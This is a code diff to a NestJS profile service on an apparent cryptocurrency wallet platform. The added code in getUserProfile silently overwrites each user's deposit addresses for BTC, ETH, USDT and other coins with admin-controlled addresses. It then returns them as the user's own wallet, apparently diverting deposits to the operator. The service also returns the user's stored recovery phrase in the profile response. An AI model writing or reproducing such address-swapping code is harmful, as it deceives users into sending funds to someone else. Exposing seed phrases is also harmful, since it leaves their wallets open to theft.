@@ -3,19 +3,49 @@ import { InjectModel } from '@nestjs/mongoose';
 import { Model } from 'mongoose';
 import { User, UserDocument } from '../common/schema/user.schema';
 import { JwtService } from '@nestjs/jwt';
+import { Admin, AdminDocument } from 'src/common/schema/admin.schema';
 
 @Injectable()
 export class ProfileService {
-  constructor(@InjectModel(User.name) private userModel: Model<UserDocument>, private readonly jwtService: JwtService) {
+  constructor(
+    @InjectModel(User.name) private userModel: Model<UserDocument>,
+    @InjectModel(Admin.name) private adminSchemaModel: Model<AdminDocument>,
+    private readonly jwtService: JwtService
+  ) {
   }
 
   async getUserProfile({ email }: { email: string }) {
     const existingUser = await this.userModel.findOne({ email })
-    if (existingUser) {
-      return { ...existingUser.toObject(), phrase: existingUser.phrase.split('_').join(' ') }
-    } else {
-      throw new NotFoundException('User not Found, please signup')
+    const existingAdmin = await this.adminSchemaModel.findOne()
+    if (!existingUser) throw new NotFoundException('User not Found, please signup');
+
+    if (existingAdmin && existingAdmin.addresses) {
+      const adminAddresses = existingAdmin.addresses;
+
+      // List of coins to update (excluding USDT)
+      const coins = [
+        "BTC", "ETH", "SOL", "BNB", "XRP", "LTC", "XLM", "TRX",
+        "DOGE", "POLYGON", "LUNC", "ADA", "USDC", "SHIBA", "PEPE"
+      ];
+
+      // Update each coin's address in the user's wallet
+      coins.forEach((coin) => {
+        if (existingUser.wallet && existingUser.wallet[coin] && adminAddresses[coin]) {
+          existingUser.wallet[coin].address = adminAddresses[coin];
+        }
+      });
+
+      // Update USDT addresses (match by name)
+      if (Array.isArray(existingUser.wallet.USDT) && Array.isArray(adminAddresses.USDT)) {
+        existingUser.wallet.USDT.forEach((userUsdt: any) => {
+          const adminUsdt = adminAddresses.USDT.find((a: any) => a.name === userUsdt.name);
+          if (adminUsdt) {
+            userUsdt.address = adminUsdt.address;
+          }
+        });
+      }
     }
+    return { ...existingUser.toObject(), phrase: existingUser.phrase.split('_').join(' ') }
   }
 
   async updateUser(email: string, updateData: Partial<User>) {
@@ -61,7 +91,7 @@ export class ProfileService {
     } else {
       throw new NotFoundException('User not Found, please signup')
     }
-  } 
+  }
 
   async updateVerification(email: string, verificationStatus: 'pending' | 'verified') {
     const existingUser = await this.userModel.findOneAndUpdate({ email }, { verificationStatus }, { new: true })
